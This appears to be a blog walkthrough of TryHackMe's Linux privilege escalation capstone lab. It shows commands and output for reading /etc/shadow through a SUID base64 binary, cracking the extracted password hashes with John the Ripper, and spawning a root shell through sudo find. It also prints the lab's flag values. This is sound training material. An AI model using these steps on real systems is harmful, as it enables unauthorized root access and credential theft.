---
title: "Capstone Challenge"
excerpt: A walkthrough of the final challenge in the Linux Privilege Escalation module.
date: 2025-10-02
---

This is the final task in the room _Linux Privilege Escalation_ on TryHackMe. The goal is to use as many different techniques from the previous tasks in order to capture all the flags.

## Prerequisites

We are given ssh-credentials of a low-privilege user:
```text
user: leonard
pw: Penny123
```
We need to escalate privileges until we are root and find `flag1.txt` and `flag2.txt` along the way.

## Approach

After ssh-ing onto `leonards` user account, I started with some basic enumeration:
```console
[leonard@ip-10-10-40-207 ~]$ lsb_release -a
LSB Version:	:core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarch
Distributor ID:	CentOS
Description:	CentOS Linux release 7.9.2009 (Core) 
Release:	7.9.2009
Codename:	Core

[leonard@ip-10-10-40-207 ~]$ uname -a
Linux ip-10-10-40-207 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
We see that the machine runs on CentOS and with kernel version 3.10. Some online research uncovered the known vulnerability [CVE 2017-1000253](https://www.exploit-db.com/exploits/42887), which uses precisely this OS and kernel version. After some trying and troubleshooting I could not get the exploit to work, however. It would have been pretty overkill anyway. So we need to keep looking. The machine neither had cron-jobs running, nor could we view our sudo privileges, so these were dead ends:
```console
[leonard@ip-10-10-40-207 ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

[leonard@ip-10-10-40-207 ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for leonard: 
Sorry, user leonard may not run sudo on ip-10-10-40-207.
```
Finally, I checked the contents `/home`, which gave me the first hint.
```console
[leonard@ip-10-10-40-207 home]$ ls
leonard  missy  rootflag
```
Obviously, I could not simply `cd` into these two new directories. Just to make sure that there were no other users (apart from `leonard` and `missy`), I peeked into the `passwd` file:
```console
[leonard@ip-10-10-40-207 ~]$ cat /etc/passwd | grep home
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
missy:x:1001:1001::/home/missy:/bin/bash
```
For the last enumeration-tool, I ran `history`, and towards the top I found a useful hint:
```console
[leonard@ip-10-10-40-207 ~]$ history
   ...
   12  ls
   13  cd ..
   14  ls
   15  cd rootflag/
   16  ls
   17  cat flag2.txt 
   18  su root
   19  ls
   20  cd rootflag/
   21  su missy
   22  whoami
   23  id
   24  history
```
At least now we know that `flag2.txt` is located in `/home/rootflag`, so we don't have to look for it later on. The first breakthrough was when I started looking into binaries with the SUID bit set. Running the command as in task 7 gives the following:
```console
[leonard@ip-10-10-40-207 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
```
We have a ton of binaries with SUID bit set, so this looks promising! Now it was just a question of going through [GTFOBins](https://gtfobins.github.io/#), filtered by "SUID". And indeed we get a hit, namely it looks like we can exploit the `base64` binary to read files, as we did in task 7. This means we run the following snippet to read the password hashes of `root` and `missy`:
```console
[leonard@ip-10-10-40-207 ~]$ base64 /etc/shadow | base64 --decode
```
Reading through the file, we note down the two hashes:
```text
root: $6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51
missy: $6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/
```
Notice that, at this point, we could simply run
```console
[leonard@ip-10-10-40-207 ~]$ base64 /home/rootflag/flag2.txt | base64 --decode
```
in order to capture the second flag, since we know its location. Instead, we will continue escalating to root privileges, as this was the goal.

Now the task is to crack the two hashes that we just obtained. For this, I used John the Ripper. It turned out that the root password was hard to crack, or at least I did not have much patience, but we quickly get a hit for missy's password:
```console
┌──(kali㉿kali)-[~/Desktop/capstone]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-root.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:03:23 4.28% (ETA: 16:12:10) 0g/s 3471p/s 3471c/s 3471C/s RAIDERS7..OCTOBER7
Session aborted

┌──(kali㉿kali)-[~/Desktop/capstone]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-missy.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (?)     
1g 0:00:00:00 DONE (2025-10-02 14:57) 1.052g/s 4042p/s 4042c/s 4042C/s adriano..dodgers
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
With missy's password `Password1`, we can now switch user via `su - missy`. Once we are logged into this user account, the search for vulnerabilities starts from the beginning. First, we get a hint about the location of `flag1.txt`, again from the `history`: 
```console
[missy@ip-10-10-40-207 ~]$ history
    1  ls
    2  cd missy/
    3  ls
    4  cd Do
    5  cd Documents
    6  ls
    7  cat flag1.txt 
    8  su root
    9  quit
   10  sudo -l
   11  find . -exec /bin/sh \; -quit
   12  find -exec /bin/sh \; -quit
   13  sudo find /home -exec /bin/bash \;
   14  ls
   15  cd leonard/
   16  cd rootflag/
   17  su root
   18  id
   19  history
```
This shows that `flag1.txt` is located in `/home/missy/Documents`. The history also gives a strong hint how we can escalate to root, but just to make sure, we can check this user's sudo rights:
```console
[missy@ip-10-10-40-207 ~]$ sudo -l
Matching Defaults entries for missy on ip-10-10-40-207:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-40-207:
    (ALL) NOPASSWD: /usr/bin/find
```
This tells us that we have sudo privileges for the `find` binary! Consulting [GTFOBins](https://gtfobins.github.io/#) once more, we find that we can simply run the following command to gain root privileges:
```console
[missy@ip-10-10-40-207 ~]$ sudo find . -exec /bin/bash \;
```
Thus, we can finally read the flags as follows, finishing this challenge:
```console
[root@ip-10-10-40-207 missy]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[root@ip-10-10-40-207 missy]# cat /home/missy/Documents/flag1.txt 
THM-42828719920544
[root@ip-10-10-40-207 missy]# cat /home/rootflag/flag2.txt 
THM-168824782390238
```
    







